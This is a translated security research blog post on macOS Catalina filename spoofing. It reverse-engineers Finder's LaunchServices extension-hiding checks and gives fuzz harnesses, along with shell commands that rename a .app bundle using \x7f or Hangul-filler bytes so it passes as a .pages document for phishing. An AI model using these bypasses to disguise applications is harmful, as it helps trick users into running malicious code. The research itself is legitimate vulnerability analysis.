> 原文链接: https://www.anquanke.com//post/id/194857 


# macOS文件名混淆技术研究


                                阅读量   
                                **1429665**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者xpnsec，文章来源：blog.xpnsec.com
                                <br>原文地址：[https://blog.xpnsec.com/macos-filename-homoglyphs-revisited/](https://blog.xpnsec.com/macos-filename-homoglyphs-revisited/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0170c7cdeca772077c.png)](https://p4.ssl.qhimg.com/t0170c7cdeca772077c.png)



## 0x00 前言

去年我发表了攻击macOS用户的一些[小技巧](https://blog.xpnsec.com/macos-phishing-tricks/)，其中就包括文件扩展名混淆技术，该技术可以利用Finder对`.app`扩展名的自动移除机制来实现文件名欺骗。

几星期前我正准备使用该技巧时，突然发现Apple已经修复了这个问题。虽然从攻击者的角度来看我会比较沮丧，但我还是可以深入分析官方的修复措施，理解现在macOS Catalina如何处理文件名，研究能否再次绕过该漏洞。在开始加载反汇编器之前，我们可以先回顾一下之前的方法。



## 0x01 先前方法

想将攻击payload投递给Mac用户是非常艰巨的一个任务。对于经过沙箱保护的常见应用（如Microsoft Office工具集），攻击者不能直接投递`.docm`文档，然后简单显示“请信任该文档”的欺骗消息来触发VBA代码。如果采用这种方式，攻击者很快就会发现自己会受到沙箱限制。

因此，我想找到投递payload（比如`.app`文件）的有效方法，让用户认为这是一个良性文件。在前一篇文章中，我演示了3个文件的视觉效果，如下图所示：

[![](https://p0.ssl.qhimg.com/t0157ce77949d5fe32b.png)](https://p0.ssl.qhimg.com/t0157ce77949d5fe32b.png)

以上这3个文件实际上都是`.app`容器，为了避免macOS显示出`.app`扩展名，我在`.docx`中使用了各种同形字符（homoglyph）。由于macOS会发现扩展名无效，因此会隐去`.app`扩展名，最终我们可以更换图标，诱骗用户打开我们构造的应用。

然而现在不幸的是，如果我们在macOS Catalina（10.15）上尝试使用这种方法，比如通过一些同形符创建`.pages`扩展名，我们可以看到如下结果：

[![](https://p4.ssl.qhimg.com/t01f3935d39bd659c52.png)](https://p4.ssl.qhimg.com/t01f3935d39bd659c52.png)

很明显Apple引入了一些改动，修复了这个问题。在继续逆向分析之前，我们可以稍微思考下。现在可以看到Finder会将`.app`扩展名附加到我们伪造的扩展名之后，但如果我们使用之前未注册过的扩展名，会出现什么情况呢？

[![](https://p5.ssl.qhimg.com/t01186a633b707b7d29.png)](https://p5.ssl.qhimg.com/t01186a633b707b7d29.png)

在这种情况下，`.app`扩展名会被成功移除。相应的，如果我们在有效扩展名后简单执行某些操作（比如添加一个空格符），会出现什么情况？结果如下：

[![](https://p0.ssl.qhimg.com/t016aa4f3398965c263.png)](https://p0.ssl.qhimg.com/t016aa4f3398965c263.png)

现在我们知道系统会执行一些过滤操作，检查我们构造的扩展名是否在当前系统中有效。接下来我们可以做一些反汇编操作，研究背后原理，看是否能再次绕过系统防护。



## 0x02 LaunchServices

大家都知道，`Finder.app`负责渲染文件名，因此我们可以将该应用载入反汇编器中，尝试了解背后原理。Finder路径为`/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder`，我们首先需要澄清哪个部分负责解析我们的文件名。

查找导入的库，我们发现Finder似乎引用了`LaunchServices`，快速搜索感兴趣的符号后，我们找到了`_ZL28_LSDNCGetForbiddenCharacterssv`。查看该函数，我们又找到了部分代码，更加确定该库可能用来负责文件名过滤：

[![](https://p0.ssl.qhimg.com/t01a29ae43ddb1fda8e.png)](https://p0.ssl.qhimg.com/t01a29ae43ddb1fda8e.png)

但为什么执行流会进入该分支？查看交叉引用信息后，我们找到了一个类：`LSDisplayNameConstructor`，其中包含一些比较有趣的方法名，比如`cleanSecondaryExtension`、`replaceForbiddenCharacters`以及`wantsHiddenExtension`。

我们首先来关注`-[_LSDisplayNameConstructor initWithContext:node:bundleClass:desiredDisplayName:treatAsFSName:]`方法，该方法用来初始化`LSDisplayNameConstructor`对象。下面使用`lldb`来添加一个断点：

```
exp @import CoreServices
breakpoint set -F "-[_LSDisplayNameConstructor(Private) initWithContext:node:bundleClass:desiredDisplayName:treatAsFSName:]"
```

设置断点后，我们可以使用Finder导航至某个目录，此时就会触发断点：

[![](https://p4.ssl.qhimg.com/t0172a07265608a1b61.png)](https://p4.ssl.qhimg.com/t0172a07265608a1b61.png)

触发断点后，我们需要获取存放在`rdi`寄存器中的我们的Objective-C `self`指针，使用`finish`命令终止运行该方法，然后就可以读取我们的成员变量。查看该类的元数据，我们可以看到其中包含一些有趣的变量：

[![](https://p4.ssl.qhimg.com/t01ad25bac800cb6e94.png)](https://p4.ssl.qhimg.com/t01ad25bac800cb6e94.png)

了解到这些信息后，我们可以做一些测试，观察文件名的解析方式。下面我们可以创建名为`test.docx.app`的一个目录，查看每个变量值：
<li>
`_baseName` – `test.docx`
</li>
<li>
`_extension` – `app`
</li>
<li>
`_secondaryExtension` – `docx`
</li>
如果在`docx`扩展名后添加一个空格符，将目录名变成`test.docx .app`，此时对应的变量值为：
<li>
`_baseName` – `test.docx`（后面带有一个空格符）</li>
<li>
`_extension` – `app`
</li>
<li>
`_secondaryExtension` – `docx`
</li>
因此这里我们看到了第一种过滤：移除第二扩展名（secondary extension）中的空格符。

在继续分析前，我们需要理解系统如何将文件名切分成不同部分。



## 0x03 CFGetPathExtensionRangesFromPathComponent

在`-[_LSDisplayNameConstructor initWithContext:node:bundleClass:desiredDisplayName:treatAsFSName:]`中，我们找到了对`initNamePartsWithDisplayName`的调用操作，该方法最终会调用`_CFGetPathExtensionRangesFromPathComponent`。该方法来自于`CoreFoundation`框架，虽然没有公开文档，但似乎会使用如下参数类型：

```
_CFGetPathExtensionRangesFromPathComponent(CFStringRef inputFilename, CFRange* extension, CFRange *secondExtension, void* res);
```

实际上我们可以在运行时使用`dlopen`及`dlsym`来与该方法交互：

```
void *lib;
typedef int (*_CFGetPathExtensionRangesFromPathComponent)(CFStringRef input, void *out1, void *out2, void *out3);
CFRange r1, r2, r3;
NSString *filename = @"test.docx.app";
_CFGetPathExtensionRangesFromPathComponent CFGetPathExtensionRangesFromPathComponent;

// Resolve the API method
lib = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
CFGetPathExtensionRangesFromPathComponent = (_CFGetPathExtensionRangesFromPathComponent)dlsym(lib, "_CFGetPathExtensionRangesFromPathComponent"); 

// Call our test method with passed ranges
CFGetPathExtensionRangesFromPathComponent((__bridge CFStringRef)(filename), &amp;r1, &amp;r2, &amp;r3);

NSLog(@"Passing filename %@", filename);
NSLog(@"r1.Location -&gt; %ld", r1.location);
NSLog(@"r1.Length -&gt; %ld", r1.length);
NSLog(@"r2.Location -&gt; %ld", r2.location);
NSLog(@"r2.Length -&gt; %ld", r2.length);

// Grab the extension
NSString *extension = [filename substringWithRange:r1];
NSLog(@"Extension -&gt; %@", extension);

// Grab the second extension    
NSString *secondaryExtension = [filename substringWithRange:r2];
NSLog(@"Secondary Extension -&gt; %@", secondaryExtension);
```

通过这种方法，我们发现每个扩展名都通过`CFRange`进行识别：

[![](https://p0.ssl.qhimg.com/t01e08c0466d7365823.png)](https://p0.ssl.qhimg.com/t01e08c0466d7365823.png)

根据上述分析，我们可知系统会根据第二扩展名的有效性来决定是否渲染`.app`扩展名，因此我们可以借此机会研究下是否可以强制让该函数不识别我们的第二扩展名，这样Finder肯定会移除掉`.app`扩展名。我们可以使用如下命令来执行fuzz测试：

```
typedef int (*_CFGetPathExtensionRangesFromPathComponent)(CFStringRef input, void *out1, void *out2, void *out3);

void runFuzz(void) `{`

    void *lib;
    char filename[CS_MAX_PATH];
    CFRange r1, r2, r3;

    _CFGetPathExtensionRangesFromPathComponent CFGetPathExtensionRangesFromPathComponent;

    lib = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
    CFGetPathExtensionRangesFromPathComponent = (_CFGetPathExtensionRangesFromPathComponent)dlsym(lib, "_CFGetPathExtensionRangesFromPathComponent");

    for(unsigned int i=1; i &lt; 0xFF; i++) `{`
        for(unsigned int j=1; j &lt; 0xFF; j++) `{`

            // Prep filename
            memset(filename, 0, sizeof(filename));
            snprintf(filename, sizeof(filename), "test.docx%c%c.app", i, j);

            // Run our test
            CFGetPathExtensionRangesFromPathComponent(CFStringCreateWithCString(kCFAllocatorDefault, filename, kCFStringEncodingASCII), &amp;r1, &amp;r2, &amp;r3);

            // Check if extension has not been found
            if (r2.location == -1) `{`
                printf("Got: %02x%02x [%c%c]\n", i, j, i, j);
            `}`
        `}`
    `}`
`}`
```

执行完毕后，根据输出结果，我们可以发现一些有趣的信息。首先，`NULL`字符将导致系统无法识别我们的第二扩展名。这也比较正常，因为该字符用来终止C形式的字符串，导致后续扩展名无法被解析。然而更有趣的是，如果传入跟在空格后的其他任意字符，系统还是会找不到第二扩展名：

[![](https://p2.ssl.qhimg.com/t01a34aaaba0b689926.png)](https://p2.ssl.qhimg.com/t01a34aaaba0b689926.png)

现在情况变得非常有趣，这意味着如果我们可以传入跟在空格符后的某个字符，并且该字符无法被Finder渲染，那么我们还是能成功混淆扩展名。



## 0x04 UTF-8的魔力

在继续操作之前，需要提一下此次研究过程中我在Finder中找到的一个bug。如果我们尝试通过某种方式命名文件（如`test.docx\x20\x80.app`），那么每当查看该文件时，Finder都会出现崩溃。实际上，由于系统没有正确处理UTF-8编码，大于`0x80`的任何值都会导致Finder崩溃：

[![](https://p2.ssl.qhimg.com/t01ec8cd51513d7cb0e.gif)](https://p2.ssl.qhimg.com/t01ec8cd51513d7cb0e.gif)

崩溃点位于`CoreFoundation`中的一个bug，具体崩溃点为`_CFBundleGetBundleVersionForURL`，该函数会调用`CFURLCopyFileSystemPath`，并且没有检查结果是否返回`NULL`值，因此出现`NULL`指针引用，导致应用崩溃。

如果大家想自己研究这个bug，可以参考[此处源码](https://github.com/opensource-apple/CF/blob/3cc41a76b1491f50813e28a4ec09954ffa359e6f/CFBundle_Resources.c#L221)。



## 0x05 继续研究

根据前文描述，我们无法在空格符之后使用大于`0x80`的值，但如果我么能提供有效的ASCII字符，会出现什么情况？结果表明此时一切正常，我们可以继续绕过Finder的过滤器。比如，我们可以使用删除符（`0x7f`），避免出现UTF-8 Finder bug，同时也能让`_CFGetPathExtensionRangesFromPathComponent`无法找到我们的第二扩展名，从而可以继续网络钓鱼攻击：

```
a=$(echo -en "test.pages\x20\x7f.app"); mv test.pages.app $a
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0128c4a91c4c784e85.png)

其实现在我们的研究可以告一段落，但我好奇心比较重，想知道系统如何进一步处理第二扩展名。因此我们可以继续前行，看是否有其他方法能达到类似的效果。



## 0x06 CleanSecondaryExtension

经过进一步研究后，我们发现实际上负责解析第二扩展名的方法为：`(void *)cleanSecondaryExtension:(void *)arg2`。

[![](https://p4.ssl.qhimg.com/t01461264d80aeecd27.png)](https://p4.ssl.qhimg.com/t01461264d80aeecd27.png)

在汇编代码中，我们能看到其中引用了许多字符集。实际上我们可以使用简单的测试用例来调用该方法，测试该方法对第二文件扩展名的影响：

```
@interface _LSDisplayNameConstructor : NSObject
`{`
`}`

-(void *)cleanSecondaryExtension:(void *)arg2;

@end

void runTest(void) `{`

    _LSDisplayNameConstructor* ls = [_LSDisplayNameConstructor alloc];

    NSString *cleaned = [ls cleanSecondaryExtension:@"pages "];

    NSLog(@"Cleaned extension: %@", cleaned);
    NSLog(@"Raw bytes:");
    NSData *bytes = [cleaned dataUsingEncoding:NSUTF8StringEncoding];

    for(int i=0; i &lt; [bytes length]; i++) `{`
        printf("%02x ", ((unsigned char *)[bytes bytes])[i]);
    `}`

    printf("\n");
`}`
```

当我们使用一系列输入值来调用该测试用例时，可以清楚地在输出结果中看到一些过滤操作。比如，如果我们尝试传入`pag es`作为扩展名，可以看到空格符会被移除：

[![](https://p3.ssl.qhimg.com/t016030876482dd03ad.png)](https://p3.ssl.qhimg.com/t016030876482dd03ad.png)

需要注意的是，该方法似乎会重点关注前面引用的字符集范围，包括空格符、换行符或者Unicode规范中标识为“非法”的字符，然而我们还是有办法能绕过这种限制。比如，我们可以使用“Ideographic Space”（表意空间）中类似UTF-8的字符码，将字符分别转化为`0xe1 0x85 0xa0`，这样就能绕过该方法的限制：

[![](https://p0.ssl.qhimg.com/t01ff5285faf57b4c57.png)](https://p0.ssl.qhimg.com/t01ff5285faf57b4c57.png)

如果我们在文件名中使用这种方法，就可以规避Finder的过滤器：

```
a=$(echo -en "test.pages\xe1\x85\xa0.app"); mv test.pages.app $a
```

[![](https://p0.ssl.qhimg.com/t01793084e92307f42a.png)](https://p0.ssl.qhimg.com/t01793084e92307f42a.png)



## 0x07 mayHideExtensionWithContext

不幸的是，现在我们仍然没有完全澄清所有疑问，比如Apple做了哪些修改，为什么我们的文件名不能再使用同形文字？

查看`_LSDisplayNameConstructor`类，我们可以看到名为`mayHideExtensionWithContext`的一个方法。该方法实际上会根据前面我们分析的方法及成员变量来收集相关信息，最终标记Finder是否需要渲染文件扩展名。

如果查看macOS Mojave中的`LaunchServices`，可以看到该函数逻辑非常简单，会通过`__LSIsKnownExtensionCFString`来判断文件名是否已注册，因此我们之前可以使用同形字符来绕过文件名检测。

在macOS Mojave 10.14.6及MacOS Catalina 10.15.0之间，该方法做了一些改动。反汇编该方法的最新版本后，我们发现其中引用了一些有趣的函数。比如其中引用了`__LSIsKnownExtensionCFString`，该函数用来验证扩展名是否存在于`LaunchService`数据库中，也能解释为什么有效扩展名与无效扩展名的处理方式会有所不同。此外，我们还找到了如下引用：

[![](https://p4.ssl.qhimg.com/t0156b63710c6075a34.png)](https://p4.ssl.qhimg.com/t0156b63710c6075a34.png)

这是Apple在该方法内首先执行的步骤，以便删除扩展名中的同形字符。比如，我们可以通过一个简单的测试用例查看处理效果：

```
NSMutableSet *extensionSet = [[NSMutableSet alloc] init];

[extensionSet addObject:[extension stringByApplyingTransform:@"Lower" reverse:false]];
[extensionSet addObject:[extension stringByApplyingTransform:@"Upper" reverse:false]];
[extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC" reverse:false]];
[extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC; Lower" reverse:false]];
[extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC; Upper" reverse:false]];

for(NSString *item in extensionSet) `{`
    NSLog(@"Mutated extension: %@", item);
`}`
```

如果使用比较直接的文件名（如`test.pàgës.app`），可以看到结果会创建多个版本的扩展名：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011f8ee89baf22b032.png)

随后，系统会使用每个变种来判断当前值是否对应已在`LaunchServices`中注册的扩展名。在上述测试案例中，结果会匹配`pages`，因此系统会添加`.app`扩展名。

这种处理并不完美，不能全面覆盖，因此Apple还引入了[ICU](http://site.icu-project.org/home)的`uspoof_getSkeleton`，用来进一步识别容易被混淆的值。此时我们可以更新测试用例，如下所示：

```
typedef void* (*uspoof_open)(int *status);
typedef void* (*uspoof_close)(void *sc);
typedef void (*uspoof_setChecks)(void *sc, int32_t checks, int *status);
typedef UInt32 (*uspoof_getSkeleton) (const void *sc, uint32_t type, const unsigned char *id, int32_t length, u_char * dest, int32_t destCapacity, int *status);

bool testUSpoof(const unsigned char *input1, const unsigned char *input2) `{`

    char output1[1024];
    char output2[1024];
    int lenString1;
    int lenString2;
    int status = 0;

    uspoof_open uspoof_open_ptr;
    uspoof_getSkeleton uspoof_getSkeleton_ptr;
    uspoof_close uspoof_close_ptr;

    memset(output1, 0, sizeof(output1));
    memset(output2, 0, sizeof(output2));

    void *lib = dlopen("/usr/lib/libicucore.A.dylib", RTLD_LAZY);

    uspoof_open_ptr = (uspoof_open)dlsym(lib, "uspoof_open");
    uspoof_getSkeleton_ptr = (uspoof_getSkeleton)dlsym(lib, "uspoof_getSkeleton");
    uspoof_close_ptr = (uspoof_close)dlsym(lib, "uspoof_close");

    void *engine = uspoof_open_ptr(&amp;status);

    lenString1 = uspoof_getSkeleton_ptr(engine, 0, input1, -1, output1, sizeof(output1), &amp;status);
    lenString2 = uspoof_getSkeleton_ptr(engine, 0, input2, -1, output2, sizeof(output2), &amp;status);

    uspoof_close_ptr(engine);

    if (lenString1 == lenString2) `{`
        if (memcmp(output1, output2, lenString1) == 0) `{`
            return true;
        `}`
    `}`

    return false;
`}`

void testCharacter(NSString *extension, unichar lower, unichar upper) `{`
    NSMutableSet *extensionSet = [[NSMutableSet alloc] init];
    unichar input1[2];
    unichar input2[2];

    memset(input1, 0, sizeof(input1));
    memset(input2, 0, sizeof(input2));

    [extensionSet addObject:[extension stringByApplyingTransform:@"Lower" reverse:false]];
    [extensionSet addObject:[extension stringByApplyingTransform:@"Upper" reverse:false]];
    [extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC" reverse:false]];
    [extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC; Lower" reverse:false]];
    [extensionSet addObject:[extension stringByApplyingTransform:@"NFD; [[:Mn:]&amp;[:Diacritic:]] Remove; [:Latin:] Latin-ASCII; NFC; Upper" reverse:false]];

    for(NSString *item in extensionSet) `{`
        if ([item characterAtIndex:0] == lower || [item characterAtIndex:0] == upper) `{`
            NSLog(@"[%@] Match found in Apple's checks, not a viable candidate", extension);
            return;
        `}`

        *input1 = lower;
        *input2 = *(unichar*)[extension cStringUsingEncoding:NSUnicodeStringEncoding];

        if (testUSpoof((const unsigned char *)input1, (const unsigned char *)input2) == true) `{`
            NSLog(@"[%@] Match found in uspoof, not a viable candidate", extension);
            return;
        `}`

        *input1 = upper;

        if (testUSpoof((const unsigned char *)input1, (const unsigned char *)input2) == true) `{`
            NSLog(@"[%@] Match found in uspoof, not a viable candidate", extension);
            return;
        `}`
    `}`

    NSLog(@"--&gt; Found a viable option: %@", extension);
`}`

void testCase(void) `{`

    NSRange r1;
    r1.length = 1;
    NSString *potentials = @"XxΧχХхⅩⅹＸｘ";

    for(int i=0; i &lt; [potentials length]; i++) `{`
        r1.location = i;
        test4([potentials substringWithRange:r1], 'x', 'X');
    `}`
`}`
```

那么这次Apple真的完美修复问题了吗？答案是否定的。我们虽然无法再使用任何同形符，但还是有一些选项可以绕过这些过滤器。比如，如果我们添加一定范围内的同形符，对其中每个字符执行上述检查，实际上我们还是能得到可以正常渲染的一些字符：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013cd2a7751ad443be.png)

与我们预期相符，我们可以创新思路，将这些字符添加到扩展名中，绕过过滤器：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01af4f86cf9af0916f.png)

以上就是本文全部内容（但只是绕过这种过滤机制的一部分方法），现在攻击者仍然可以通过这种方式向受害者投递钓鱼payload。如果未来系统还有更新（或者等我下次有机会针对Mac环境做渗透测试时），我们可以再回顾这方面内容。
